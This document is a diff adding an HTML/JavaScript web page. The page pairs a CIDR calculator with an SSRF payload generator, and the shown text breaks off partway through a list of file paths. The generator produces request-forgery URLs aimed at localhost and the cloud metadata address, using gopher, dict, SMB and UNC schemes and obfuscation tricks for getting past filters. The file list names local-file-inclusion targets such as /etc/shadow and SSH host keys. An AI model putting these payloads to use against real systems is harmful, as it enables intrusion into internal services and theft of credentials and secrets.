@@ -1,0 +1,1651 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Tool - 1135</title>
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="stylesheet" href="../../css/style.css">
+    <style>
+        /* Tool Specific Styles */
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .input-section {
+            background: var(--surface-color);
+            padding: 30px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .ip-input {
+            width: 100%;
+            max-width: 500px;
+            padding: 15px;
+            font-size: 1.2rem;
+            background: var(--bg-color);
+            border: 2px solid var(--primary-color);
+            color: var(--text-primary);
+            border-radius: 4px;
+            font-family: var(--font-mono);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .ip-input:focus {
+            outline: none;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+
+        .results-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 4px;
+        }
+
+        .card h3 {
+            color: var(--primary-color);
+            font-size: 1rem;
+            margin-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+        }
+
+        .label {
+            color: var(--text-secondary);
+        }
+
+        .value {
+            color: var(--text-primary);
+            font-weight: bold;
+        }
+
+        .binary-row {
+            margin-top: 15px;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            word-break: break-all;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .tag-public {
+            background: rgba(0, 255, 65, 0.2);
+            color: #00ff41;
+        }
+
+        .tag-private {
+            background: rgba(255, 204, 0, 0.2);
+            color: #ffcc00;
+        }
+
+        .tag-reserved {
+            background: rgba(255, 0, 85, 0.2);
+            color: #ff0055;
+        }
+
+        /* SSRF Payloads Section */
+        .ssrf-section {
+            margin-top: 40px;
+            padding-top: 40px;
+            border-top: 2px solid var(--border-color);
+        }
+
+        .output-block {
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .output-block:hover {
+            border-color: var(--primary-color);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .output-block h3 {
+            color: var(--primary-color);
+            font-size: 1rem;
+            margin-bottom: 10px;
+            font-family: var(--font-mono);
+        }
+
+        .hint-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(0, 255, 65, 0.05);
+            border-left: 3px solid var(--primary-color);
+            border-radius: 4px;
+        }
+
+        .hint-section strong {
+            color: var(--primary-color);
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .code-with-copy {
+            position: relative;
+            margin: 8px 0;
+        }
+
+        .code-with-copy .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            z-index: 10;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: auto;
+            padding: 4px 8px;
+            background: var(--primary-color);
+            color: var(--bg-color);
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 11px;
+        }
+
+        .code-with-copy:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .code-with-copy .copy-btn:hover {
+            background: var(--primary-hover);
+        }
+
+        .hint-code {
+            position: relative;
+            margin: 0;
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 10px;
+            overflow-x: auto;
+            font-family: var(--font-mono);
+            font-size: 14px;
+            color: var(--text-primary);
+        }
+
+        .hint-code code {
+            font-family: inherit;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Navigation -->
+    <div id="navigation-container"></div>
+    <script>
+        // Load Navigation immediately on body start to minimize FOUC
+        (function () {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', '../../navigation.html', false); // Synchronous to prevent flash
+            try {
+                xhr.send();
+                if (xhr.status === 200) {
+                    const navContainer = document.getElementById('navigation-container');
+                    navContainer.innerHTML = xhr.responseText;
+                }
+            } catch (e) {
+                console.error('Failed to load navigation:', e);
+            }
+        })();
+    </script>
+
+    <div class="container">
+        <!-- Module 1: CIDR Calculator -->
+        <div class="input-section">
+            <h1 style="margin-bottom: 20px; color: var(--primary-color);">CIDR Calculator & Info</h1>
+            <input type="text" id="ip-input" class="ip-input" placeholder="e.g. 192.168.1.1/24" oninput="calculateIP()">
+            <p style="color: var(--text-secondary); margin-bottom: 15px;">Supports IPv4 CIDR notation</p>
+            <div class="examples" style="display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;">
+                <button class="btn btn-sm" onclick="setIP('192.168.1.1/24')">192.168.1.1/24</button>
+                <button class="btn btn-sm" onclick="setIP('10.0.0.0/8')">10.0.0.0/8</button>
+                <button class="btn btn-sm" onclick="setIP('172.16.0.0/12')">172.16.0.0/12</button>
+            </div>
+        </div>
+
+        <div class="results-grid" id="results" style="display: none;">
+            <!-- Network Info -->
+            <div class="card">
+                <h3 data-i18n="ip_network_info">Network Details</h3>
+                <div class="info-row">
+                    <span class="label">IP Address:</span>
+                    <span class="value" id="res-ip"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Netmask:</span>
+                    <span class="value" id="res-mask"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Network Address:</span>
+                    <span class="value" id="res-net"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Broadcast:</span>
+                    <span class="value" id="res-broadcast"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Type:</span>
+                    <span class="value" id="res-type"></span>
+                </div>
+                <div id="res-type-desc"
+                    style="margin-top: 10px; padding: 10px; background: rgba(255,255,255,0.05); border-left: 3px solid var(--primary-color); font-size: 0.85rem; color: var(--text-secondary); display: none;">
+                </div>
+            </div>
+
+            <!-- Range Info -->
+            <div class="card">
+                <h3 data-i18n="ip_range_info">Address Range</h3>
+                <div class="info-row">
+                    <span class="label">First Usable:</span>
+                    <span class="value" id="res-first"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Last Usable:</span>
+                    <span class="value" id="res-last"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Total Hosts:</span>
+                    <span class="value" id="res-total"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Usable Hosts:</span>
+                    <span class="value" id="res-usable"></span>
+                </div>
+            </div>
+
+            <!-- Formats -->
+            <div class="card">
+                <h3 data-i18n="ip_formats">Formats</h3>
+                <div class="info-row">
+                    <span class="label">Decimal:</span>
+                    <span class="value" id="res-decimal"></span>
+                </div>
+                <div class="info-row">
+                    <span class="label">Hex:</span>
+                    <span class="value" id="res-hex"></span>
+                </div>
+                <div class="binary-row">
+                    <div style="margin-bottom: 5px;">Binary (IP):</div>
+                    <div id="res-bin-ip" style="color: var(--accent-color);"></div>
+                </div>
+                <div class="binary-row">
+                    <div style="margin-bottom: 5px;">Binary (Mask):</div>
+                    <div id="res-bin-mask" style="color: var(--text-primary);"></div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Module 2: SSRF Generator -->
+    <div class="container">
+        <div class="input-section">
+            <h1 style="margin-bottom: 20px; color: var(--primary-color);">🔗 SSRF Payload Generator</h1>
+            <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px;">
+                <div style="flex: 1; min-width: 250px;">
+                    <label for="ssrf-ip-input"
+                        style="display: block; margin-bottom: 8px; color: var(--text-secondary);">Target IP /
+                        Domain</label>
+                    <input type="text" id="ssrf-ip-input" class="ip-input" placeholder="e.g. 127.0.0.1"
+                        style="margin-bottom: 0;" oninput="generateSSRF()">
+                    <div id="ssrf-input-hint" style="display: none; margin-top: 5px; font-size: 0.75em; color: var(--text-secondary); line-height: 1.4;">
+                        <span style="color: var(--primary-color);">🌐 Input Type: Domain/Hostname</span><br>
+                        IP format variations are not applicable. Only protocol schemes, encoding, and domain-specific bypasses are shown.
+                    </div>
+                </div>
+                <div style="flex: 0 0 150px;">
+                    <label for="ssrf-port-input"
+                        style="display: block; margin-bottom: 8px; color: var(--text-secondary);">Port</label>
+                    <input type="number" id="ssrf-port-input" class="ip-input" placeholder="80" value="80"
+                        style="margin-bottom: 0;" oninput="generateSSRF()">
+                </div>
+                <div style="flex: 1; min-width: 200px;">
+                    <label for="ssrf-path-input"
+                        style="display: block; margin-bottom: 8px; color: var(--text-secondary);">Path
+                        (Optional)</label>
+                    <input type="text" id="ssrf-path-input" class="ip-input" placeholder="/admin"
+                        style="margin-bottom: 0;" oninput="generateSSRF()">
+                </div>
+            </div>
+            <!-- Floating Copy Button -->
+            <button onclick="copyAllPayloads()" id="fab-copy-btn" title="Copy All Payloads">
+                Copy All Payloads
+            </button>
+            <style>
+                #fab-copy-btn {
+                    position: fixed;
+                    bottom: 30px;
+                    right: 30px;
+                    width: 60px;
+                    height: 60px;
+                    border-radius: 50%;
+                    background: var(--primary-color);
+                    color: var(--bg-color);
+                    border: none;
+                    box-shadow: 0 4px 15px rgba(0, 255, 65, 0.4);
+                    font-size: 10px;
+                    font-weight: 500;
+                    cursor: pointer;
+                    z-index: 1000;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    transition: all 0.3s ease;
+                    text-align: center;
+                    line-height: 1.2;
+                    padding: 4px;
+                    word-wrap: break-word;
+                }
+
+                #fab-copy-btn:hover {
+                    transform: scale(1.1);
+                    box-shadow: 0 6px 20px rgba(0, 255, 65, 0.6);
+                }
+
+                #fab-copy-btn:active {
+                    transform: scale(0.95);
+                }
+
+                /* Hide initially, show when SSRF section is visible */
+                #ssrf-section[style*="display: none"]~#fab-copy-btn {
+                    display: none;
+                }
+            </style>
+        </div>
+
+        <!-- SSRF Payloads Section -->
+        <div class="ssrf-section" id="ssrf-section" style="display: none; margin-top: 0; border-top: none;">
+
+            <div class="output-block" id="ssrf-protocols-container">
+                <h3>1 - Protocol Schemes</h3>
+            </div>
+
+            <div class="output-block" id="ssrf-ip-formats-container">
+                <h3>2 - IP Format Variations</h3>
+            </div>
+
+            <div class="output-block" id="ssrf-encoding-container">
+                <h3>3 - URL Encoding</h3>
+            </div>
+
+            <div class="output-block" id="ssrf-special-container">
+                <h3>4 - Special Bypasses</h3>
+            </div>
+
+            <div class="output-block" id="ssrf-obfuscation-container">
+                <h3>5 - Obfuscation (Unicode)</h3>
+            </div>
+
+            <div class="output-block" id="ssrf-bypass-filters-container">
+                <h3>6 - Bypassing Filters</h3>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="../../js/main.js"></script>
+    <script>
+        // Navigation is already loaded, just ensure language is applied
+                if (typeof applyLanguage === 'function') {
+                    applyLanguage(localStorage.getItem('lang') || 'zh');
+                }
+
+        // Initialize Defaults on Load
+        window.addEventListener('DOMContentLoaded', initDefaults);
+
+        function initDefaults() {
+            const ips = ['127.0.0.1', '169.254.169.254', '0.0.0.0', '127.1', 'localhost'];
+            const ports = ['80', '8080', '22', '3306', '6379'];
+            const paths = ['/admin', '/latest/meta-data/', '/server-status'];
+
+            const randomIp = ips[Math.floor(Math.random() * ips.length)];
+            const randomPort = ports[Math.floor(Math.random() * ports.length)];
+            const randomPath = paths[Math.floor(Math.random() * paths.length)];
+
+            document.getElementById('ssrf-ip-input').value = randomIp;
+            document.getElementById('ssrf-port-input').value = randomPort;
+            document.getElementById('ssrf-path-input').value = randomPath;
+
+            // Trigger generation
+            generateSSRF();
+        }
+
+        // IP Logic
+        function setIP(ip) {
+            document.getElementById('ip-input').value = ip;
+            calculateIP();
+        }
+
+        function calculateIP() {
+            const input = document.getElementById('ip-input').value.trim();
+            const results = document.getElementById('results');
+
+            if (!input) {
+                results.style.display = 'none';
+                return;
+            }
+
+            try {
+                    calculateIPv4(input);
+            } catch (e) {
+                // console.error(e);
+                results.style.display = 'none';
+            }
+        }
+
+        // SSRF Logic
+        function generateSSRF() {
+            const ipInput = document.getElementById('ssrf-ip-input').value.trim();
+            const portInput = document.getElementById('ssrf-port-input').value.trim();
+            const pathInput = document.getElementById('ssrf-path-input').value.trim();
+            const ssrfSection = document.getElementById('ssrf-section');
+            const fabCopyBtn = document.getElementById('fab-copy-btn');
+
+
+            if (!ipInput) {
+                ssrfSection.style.display = 'none';
+                if (fabCopyBtn) fabCopyBtn.style.display = 'none'; // Hide FAB if no input
+                return;
+            }
+
+            // Basic IP validation (loose to allow domains)
+            // If it looks like an IP, parse it. If not, treat as domain/string.
+            let ipNum = 0;
+            const isIP = validateIPv4(ipInput);
+            if (isIP) {
+                ipNum = ipToLong(ipInput);
+            }
+
+            // Show/hide domain hint
+            const domainHint = document.getElementById('ssrf-input-hint');
+            if (domainHint) {
+                domainHint.style.display = (!isIP && ipInput) ? 'block' : 'none';
+            }
+
+            // Normalize path (ensure it starts with / if not empty)
+            let path = pathInput;
+            if (path && !path.startsWith('/')) {
+                path = '/' + path;
+            }
+
+            generateSSRFPayloads(ipInput, ipNum, portInput || 80, path || '');
+            if (fabCopyBtn) fabCopyBtn.style.display = 'flex'; // Show FAB when SSRF section is visible
+        }
+
+        function calculateIPv4(input) {
+            const results = document.getElementById('results');
+            let [ipStr, maskStr] = input.split('/');
+
+            if (!validateIPv4(ipStr)) throw new Error('Invalid IPv4');
+
+            let maskBits = 32;
+            if (maskStr) {
+                maskBits = parseInt(maskStr);
+                if (isNaN(maskBits) || maskBits < 0 || maskBits > 32) throw new Error('Invalid Mask');
+            }
+
+            const ipNum = ipToLong(ipStr);
+            const maskNum = -1 << (32 - maskBits);
+            const netNum = ipNum & maskNum;
+            const broadcastNum = netNum | (~maskNum);
+
+            // Update UI
+            results.style.display = 'grid';
+
+            document.getElementById('res-ip').textContent = ipStr + ' (IPv4)';
+            document.getElementById('res-mask').textContent = longToIp(maskNum) + ' /' + maskBits;
+            document.getElementById('res-net').textContent = longToIp(netNum) + '/' + maskBits;
+            document.getElementById('res-broadcast').textContent = longToIp(broadcastNum);
+
+            // Type
+            const type = getIPv4Type(ipNum);
+            const typeEl = document.getElementById('res-type');
+            typeEl.innerHTML = `<span class="tag tag-${type.class}">${type.name}</span>`;
+
+            const descEl = document.getElementById('res-type-desc');
+            if (type.description) {
+                descEl.textContent = type.description;
+                descEl.style.display = 'block';
+            } else {
+                descEl.style.display = 'none';
+            }
+
+            // Range
+            const firstUsable = (maskBits >= 31) ? netNum : netNum + 1;
+            const lastUsable = (maskBits >= 31) ? broadcastNum : broadcastNum - 1;
+            const total = Math.pow(2, 32 - maskBits);
+            const usable = (maskBits >= 31) ? total : total - 2;
+
+            document.getElementById('res-first').textContent = longToIp(firstUsable);
+            document.getElementById('res-last').textContent = longToIp(lastUsable);
+            document.getElementById('res-total').textContent = total.toLocaleString();
+            document.getElementById('res-usable').textContent = usable > 0 ? usable.toLocaleString() : 0;
+
+            // Formats
+            document.getElementById('res-decimal').textContent = (ipNum >>> 0);
+            document.getElementById('res-hex').textContent = '0x' + (ipNum >>> 0).toString(16).toUpperCase();
+            document.getElementById('res-bin-ip').textContent = toBinaryString(ipNum);
+            document.getElementById('res-bin-mask').textContent = toBinaryString(maskNum);
+        }
+
+        // SSRF Payload Generation
+        function generateSSRFPayloads(ip, ipNum, port, path) {
+            const ssrfSection = document.getElementById('ssrf-section');
+            if (!ssrfSection) return;
+
+            ssrfSection.style.display = 'block';
+
+            // Determine if input is IP or domain
+            const isIP = validateIPv4(ip);
+            
+            // Extract IP parts (only valid for IP addresses)
+            let parts = [];
+            if (isIP) {
+                parts = ip.split('.');
+            }
+
+
+            // Generate protocol schemes (works for both IP and domain)
+            generateProtocolPayloads(ip, port, path);
+
+            // Display /etc/hosts separately (commonly used, easy to access)
+            renderCommonHostsFile(port, path);
+
+            // Generate IP format variations (IP only)
+            if (isIP) {
+                generateIPFormatPayloads(ip, ipNum, parts, port, path);
+            } else {
+                const container = document.getElementById('ssrf-ip-formats-container');
+                container.innerHTML = '<h3>2 - IP Format Variations</h3><div class="hint-section"><p style="color: var(--text-secondary);">⚠️ This section requires a valid IPv4 address. IP format variations (octal, hex, decimal conversions) are not applicable to domain names.</p></div>';
+            }
+
+            // Generate URL encoding payloads (distinguish IP vs domain)
+            generateEncodingPayloads(ip, ipNum, port, path, isIP);
+
+            // Generate special bypass payloads (distinguish IP vs domain)
+            generateSpecialPayloads(ip, ipNum, parts, port, path, isIP);
+
+            // Generate obfuscation payloads (IP only)
+            if (isIP) {
+                generateObfuscationPayloads(ip, parts, port, path);
+            } else {
+                const container = document.getElementById('ssrf-obfuscation-container');
+                container.innerHTML = '<h3>5 - Obfuscation Techniques</h3><div class="hint-section"><p style="color: var(--text-secondary);">⚠️ This section requires a valid IPv4 address. Obfuscation techniques (Unicode, Full Width) are designed for IP addresses.</p></div>';
+            }
+
+            // Generate bypass filter payloads
+            generateBypassFiltersPayloads(ip, ipNum, parts, port, path, isIP);
+
+            // Extended LFI Payloads (Collapsible)
+            renderExtendedLFIPayloads();
+        }
+
+        // Helper to render payloads with hints and variations
+        function renderPayloads(containerId, payloads, port) {
+            const container = document.getElementById(containerId);
+            if (!container) return;
+
+            // Clear existing content (keep header)
+            const header = container.querySelector('h3');
+            container.innerHTML = '';
+            if (header) container.appendChild(header);
+
+            // Create a single codeWrapper for all hint sections within this container
+            const codeWrapper = document.createElement('div');
+            codeWrapper.className = 'code-with-copy';
+
+            payloads.forEach(item => {
+                const hintSection = document.createElement('div');
+                hintSection.className = 'hint-section';
+
+                // Title Line
+                const strong = document.createElement('strong');
+                let portTag = '';
+                if (item.noPort) {
+                    portTag = '<span class="tag tag-reserved" style="font-size: 0.7em; margin-left: 5px;">No Port</span>';
+            } else {
+                    portTag = `<span class="tag tag-private" style="font-size: 0.7em; margin-left: 5px;">Port: ${port}</span>`;
+                }
+                strong.innerHTML = `${item.name} ${portTag}`;
+                hintSection.appendChild(strong);
+
+                // Description (Hint)
+                if (item.description) {
+                    const desc = document.createElement('p');
+                    desc.style.fontSize = '0.85em';
+                    desc.style.color = 'var(--text-secondary)';
+                    desc.style.marginBottom = '5px';
+                    desc.textContent = item.description;
+                    hintSection.appendChild(desc);
+                }
+
+                // Main Payload Code
+                createCodeBlock(hintSection, item.url);
+
+                // Universal Variations (Auto-generated)
+                // Combine manual variations with auto-generated ones
+                let allVariations = item.variations || [];
+
+                // Generate universal variations for the main URL
+                const autoVariations = getPayloadVariations(item.url);
+
+                // Merge, avoiding duplicates if manual variations cover the same ground (simple check)
+                autoVariations.forEach(av => {
+                    if (!allVariations.some(mv => mv.name === av.name)) {
+                        allVariations.push(av);
+                    }
+                });
+
+                // Render Variations
+                if (allVariations.length > 0) {
+                    const varContainer = document.createElement('div');
+                    varContainer.style.marginLeft = '20px';
+                    varContainer.style.marginTop = '10px';
+                    varContainer.style.borderLeft = '2px solid var(--border-color)';
+                    varContainer.style.paddingLeft = '10px';
+
+                    allVariations.forEach(v => {
+                        const vTitle = document.createElement('div');
+                        vTitle.style.fontSize = '0.85em';
+                        vTitle.style.fontWeight = 'bold';
+                        vTitle.style.color = 'var(--text-secondary)';
+                        vTitle.textContent = v.name;
+                        varContainer.appendChild(vTitle);
+
+                        createCodeBlock(varContainer, v.url);
+                    });
+                    hintSection.appendChild(varContainer);
+                }
+
+                codeWrapper.appendChild(hintSection);
+            });
+
+            container.appendChild(codeWrapper);
+        }
+
+        function getPayloadVariations(url) {
+            const variations = [];
+
+            try {
+                // Removed URL Encoded and Double URL Encoded as per user request
+                // 1. URL Encoded (Removed)
+                // 2. Double URL Encoded (Removed)
+
+                // 3. Unicode Obfuscation (for IP part if present)
+                // Simple regex to find IP-like strings
+                const ipMatch = url.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+                if (ipMatch) {
+                    const ip = ipMatch[1];
+                    const parts = ip.split('.');
+                    const fullWidthNumbers = ['０', '１', '２', '３', '４', '５', '６', '７', '８', '９'];
+
+                    const mapDigits = (str, map) => {
+                        return str.split('').map(char => {
+                            if (char >= '0' && char <= '9') {
+                                return map[parseInt(char)];
+                            }
+                            return char;
+                        }).join('');
+                    };
+
+                    const fullWidthIP = parts.map(part => mapDigits(part, fullWidthNumbers)).join('。');
+                    variations.push({
+                        name: 'Unicode Obfuscation (Full Width)',
+                        url: url.replace(ip, fullWidthIP)
+                    });
+                }
+
+            } catch (e) {
+                console.error('Error generating variations:', e);
+            }
+
+            return variations;
+        }
+
+        function copyAllPayloads() {
+            const ssrfSection = document.getElementById('ssrf-section');
+            if (!ssrfSection || ssrfSection.style.display === 'none') return;
+
+            const codes = ssrfSection.querySelectorAll('.hint-code code');
+            if (codes.length === 0) return;
+
+            let allText = '';
+            codes.forEach(code => {
+                allText += code.textContent + '\n';
+            });
+
+            navigator.clipboard.writeText(allText).then(() => {
+                const btn = document.getElementById('fab-copy-btn');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '✅';
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                }, 1500);
+            }).catch(err => {
+                console.error('Failed to copy all:', err);
+            });
+        }
+
+        /**
+         * Create a code block with copy button
+         * Matches the implementation in xss_weaponization for consistency
+         * 
+         * @param {HTMLElement} parent - Parent element to append the code block to
+         * @param {string} text - The code text to display and copy
+         */
+        function createCodeBlock(parent, text) {
+            const cmdWrapper = document.createElement('div');
+            cmdWrapper.className = 'code-with-copy';
+            cmdWrapper.style.position = 'relative';
+            cmdWrapper.style.margin = '5px 0';
+
+            const copyBtn = document.createElement('button');
+            copyBtn.className = 'copy-btn';
+            copyBtn.textContent = 'Copy';
+            copyBtn.style.position = 'absolute';
+            copyBtn.style.top = '5px';
+            copyBtn.style.right = '5px';
+            copyBtn.style.zIndex = '10';
+            copyBtn.style.opacity = '0';
+            copyBtn.style.transition = 'opacity 0.3s ease';
+            copyBtn.style.pointerEvents = 'auto'; // Ensure button is clickable even when parent has pointer-events
+            copyBtn.onclick = function (e) {
+                e.stopPropagation();
+                navigator.clipboard.writeText(text).then(() => {
+                    const originalText = copyBtn.textContent;
+                    copyBtn.textContent = 'Copied!';
+                    setTimeout(() => {
+                        copyBtn.textContent = originalText;
+                    }, 1500);
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
+                });
+            };
+
+            const pre = document.createElement('pre');
+            pre.className = 'hint-code';
+            pre.style.padding = '8px';
+            const code = document.createElement('code');
+            code.textContent = text;
+            pre.appendChild(code);
+
+            // Add hover effect to show copy button (matching xss_weaponization)
+            cmdWrapper.addEventListener('mouseenter', function () {
+                copyBtn.style.opacity = '1';
+            });
+            cmdWrapper.addEventListener('mouseleave', function () {
+                copyBtn.style.opacity = '0';
+            });
+
+            cmdWrapper.appendChild(copyBtn);
+            cmdWrapper.appendChild(pre);
+            parent.appendChild(cmdWrapper);
+        }
+
+        function generateProtocolPayloads(ip, port, path) {
+            const protocols = [
+                { name: 'HTTP', url: `http://${ip}:${port}${path}`, description: 'Standard HTTP request.' },
+                { name: 'HTTPS', url: `https://${ip}:${port}${path}`, description: 'Secure HTTP request.' },
+                { name: 'Gopher', url: `gopher://${ip}:${port}${path}`, description: 'Legacy protocol, often used to exploit internal services (Redis, MySQL).' },
+                { name: 'Dict', url: `dict://${ip}:${port}${path}`, description: 'Dictionary network protocol.' },
+                { name: 'LDAP', url: `ldap://${ip}:${port}${path}`, description: 'Lightweight Directory Access Protocol.' },
+                { name: 'FTP', url: `ftp://${ip}:${port}${path}`, description: 'File Transfer Protocol.' },
+                { name: 'SFTP', url: `sftp://${ip}:${port}${path}`, description: 'SSH File Transfer Protocol.' },
+                { name: 'TFTP', url: `tftp://${ip}:${port}${path}`, description: 'Trivial File Transfer Protocol.' },
+                { name: 'SMB', url: `smb://${ip}${path}`, noPort: true, description: 'Server Message Block (Windows shares).' },
+                { name: 'UNC Path', url: `\\\\${ip}\\share${path.replace(/\//g, '\\')}`, noPort: true, description: 'Windows UNC path for accessing shares.' }
+            ];
+
+            renderPayloads('ssrf-protocols-container', protocols, port);
+        }
+
+        function renderCommonHostsFile(port, path) {
+            const container = document.getElementById('ssrf-protocols-container');
+            if (!container) return;
+
+            // Create a separate section for /etc/hosts
+            const hostsSection = document.createElement('div');
+            hostsSection.className = 'hint-section';
+            hostsSection.style.cssText = 'margin-top: 20px; padding: 10px; background: var(--bg-secondary); border-left: 3px solid var(--primary-color);';
+
+            const strong = document.createElement('strong');
+            strong.textContent = 'File: /etc/hosts';
+            strong.style.fontSize = '1em';
+            hostsSection.appendChild(strong);
+
+            const desc = document.createElement('p');
+            desc.style.fontSize = '0.85em';
+            desc.style.color = 'var(--text-secondary)';
+            desc.style.marginTop = '5px';
+            desc.style.marginBottom = '5px';
+            desc.textContent = 'Linux network hosts file (commonly used for SSRF).';
+            hostsSection.appendChild(desc);
+
+            createCodeBlock(hostsSection, 'file:///etc/hosts');
+            container.appendChild(hostsSection);
+        }
+
+        function renderExtendedLFIPayloads() {
+            const container = document.getElementById('ssrf-protocols-container');
+            if (!container) return;
+
+            // Extended Linux file paths from read_localfile.html
+            const extendedFiles = [
+                '/etc/passwd', '/etc/shadow', '/etc/aliases', '/etc/anacrontab',
+                '/var/lib/mlocate/mlocate.db', '/proc/self/cmdline', '/etc/apache2/apache2.conf',
+                '/etc/apache2/httpd.conf', '/etc/at.allow', '/etc/at.deny', '/etc/bashrc',
+                '/etc/bootptab', '/etc/chrootUsers', '/etc/chttp.conf', '/etc/cron.allow',
+                '/etc/cron.deny', '/etc/crontab', '/etc/cups/cupsd.conf', '/etc/exports',
+                '/etc/fstab', '/etc/ftpaccess', '/etc/ftpchroot', '/etc/ftphosts',
+                '/etc/groups', '/etc/grub.conf', '/etc/hosts.allow',
+                '/etc/hosts.deny', '/etc/httpd/access.conf', '/etc/httpd/conf/httpd.conf',
+                '/etc/httpd/httpd.conf', '/etc/httpd/logs/access_log', '/etc/httpd/logs/access.log',
+                '/etc/httpd/logs/error_log', '/etc/httpd/logs/error.log', '/etc/httpd/php.ini',
+                '/etc/httpd/srm.conf', '/etc/inetd.conf', '/etc/inittab', '/etc/issue',
+                '/etc/lighttpd.conf', '/etc/lilo.conf', '/etc/logrotate.d/ftp',
+                '/etc/logrotate.d/proftpd', '/etc/logrotate.d/vsftpd.log', '/etc/lsb-release',
+                '/etc/motd', '/etc/modules.conf', '/etc/mtab', '/etc/my.cnf', '/etc/my.conf',
+                '/etc/mysql/my.cnf', '/etc/network/interfaces', '/etc/networks', '/etc/npasswd',
+                '/etc/php4.4/fcgi/php.ini', '/etc/php4/apache2/php.ini', '/etc/php4/apache/php.ini',
+                '/etc/php4/cgi/php.ini', '/etc/php5/apache2/php.ini', '/etc/php5/apache/php.ini',
+                '/etc/php/apache2/php.ini', '/etc/php/apache/php.ini', '/etc/php/cgi/php.ini',
+                '/etc/php.ini', '/etc/php/php4/php.ini', '/etc/php/php.ini', '/etc/printcap',
+                '/etc/profile', '/etc/proftp.conf', '/etc/proftpd/proftpd.conf', '/etc/pure-ftpd.conf',
+                '/etc/pureftpd.passwd', '/etc/pureftpd.pdb', '/etc/pure-ftpd/pure-ftpd.conf',
+                '/etc/pure-ftpd/pure-ftpd.pdb', '/etc/pure-ftpd/putreftpd.pdb', '/etc/redhat-release',
+                '/etc/resolv.conf', '/etc/samba/smb.conf', '/etc/snmpd.conf', '/etc/ssh/ssh_config',
+                '/etc/ssh/sshd_config', '/etc/ssh/ssh_host_dsa_key', '/etc/ssh/ssh_host_dsa_key.pub',
+                '/etc/ssh/ssh_host_key', '/etc/ssh/ssh_host_key.pub', '/etc/sysconfig/network',
+                '/etc/syslog.conf', '/etc/termcap', '/etc/vhcs2/proftpd/proftpd.conf',
+                '/etc/vsftpd.chroot_list', '/etc/vsftpd.conf', '/etc/vsftpd/vsftpd.conf',
+                '/etc/wu-ftpd/ftpaccess', '/etc/wu-ftpd/ftphosts', '/etc/wu-ftpd/ftpusers',
+                '/logs/pure-ftpd.log', '/logs/security_debug_log', '/logs/security_log',
+                '/opt/lampp/etc/httpd.conf', '/opt/xampp/etc/php.ini', '/proc/cpuinfo',
+                '/proc/filesystems', '/proc/interrupts', '/proc/ioports', '/proc/meminfo',
+                '/proc/modules', '/proc/mounts', '/proc/stat', '/proc/swaps', '/proc/version',
+                '/proc/self/net/arp', '/root/anaconda-ks.cfg', '/usr/etc/pure-ftpd.conf',
+                '/usr/lib/php.ini', '/usr/lib/php/php.ini', '/usr/local/apache/conf/modsec.conf',
+                '/usr/local/apache/conf/php.ini', '/usr/local/apache/log', '/usr/local/apache/logs',
+                '/usr/local/apache/logs/access_log', '/usr/local/apache/logs/access.log',
+                '/usr/local/apache/audit_log', '/usr/local/apache/error_log', '/usr/local/apache/error.log',
+                '/usr/local/cpanel/logs', '/usr/local/cpanel/logs/access_log', '/usr/local/cpanel/logs/error_log',
+                '/usr/local/cpanel/logs/license_log', '/usr/local/cpanel/logs/login_log',
+                '/usr/local/cpanel/logs/stats_log', '/usr/local/etc/httpd/logs/access_log',
+                '/usr/local/etc/httpd/logs/error_log', '/usr/local/etc/php.ini',
+                '/usr/local/etc/pure-ftpd.conf', '/usr/local/etc/pureftpd.pdb', '/usr/local/lib/php.ini',
+                '/usr/local/php4/httpd.conf', '/usr/local/php4/httpd.conf.php', '/usr/local/php4/lib/php.ini',
